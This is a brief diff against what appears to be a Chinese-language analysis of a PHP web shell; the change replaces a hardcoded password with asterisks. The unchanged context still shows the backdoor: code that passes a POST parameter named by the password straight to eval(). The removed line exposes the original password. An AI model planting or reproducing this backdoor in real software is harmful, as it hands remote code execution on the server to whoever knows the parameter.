@@ -7,7 +7,7 @@
 关键特征：
 
 ```php
-$password = "ts888999";
+$password="***";
 
 if (isset($_POST[$password])) {
     eval($_POST[$password]);
